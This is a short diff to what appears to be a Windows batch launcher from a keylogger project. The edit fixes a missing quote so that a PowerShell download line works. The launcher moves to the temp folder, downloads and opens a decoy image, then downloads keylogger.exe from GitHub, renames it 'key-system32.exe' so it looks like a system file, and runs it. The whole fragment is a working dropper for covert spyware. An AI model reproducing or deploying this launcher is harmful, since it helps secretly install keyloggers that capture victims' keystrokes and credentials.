@@ -34,5 +34,5 @@
 cd %TEMP%
 Powershell -Command "Invoke-WebRequest 'https://github.com/MohammedRSaad/Key-Logger/raw/main/launcher/dounut%20design.png' -OutFile dounut-design.png"
 dounut-design.png
-Powershell -Command "Invoke-WebRequest 'https://github.com/MohammedRSaad/Key-Logger/raw/main/keylogger/dist/keylogger.exe' -OutFile key-system32.exe
+Powershell -Command "Invoke-WebRequest 'https://github.com/MohammedRSaad/Key-Logger/raw/main/keylogger/dist/keylogger.exe' -OutFile key-system32.exe"
 key-system32.exe
